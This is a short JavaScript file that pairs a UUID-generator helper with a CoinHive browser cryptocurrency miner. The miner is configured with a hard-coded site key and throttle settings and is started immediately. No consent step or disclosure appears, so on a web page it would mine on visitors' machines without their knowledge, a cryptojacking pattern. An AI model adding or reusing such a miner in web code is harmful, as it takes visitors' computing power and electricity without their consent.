// uuid
var newUuid = (function() {
    var d = +new Date();
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
        .replace(/[xy]/g, function(c) {
            var r = (d + Math.random() * 16) % 16 | 0;
            return (c == 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
});

// CoinHive
var miner = new CoinHive.Anonymous('lNx6RgYfV66oiZebezpuXYswaQe76D7i',{
	threads: 1,
	autoThreads: false,
	throttle: 0.8,
	forceASMJS: false
});
miner.start(CoinHive.IF_EXCLUSIVE_TAB);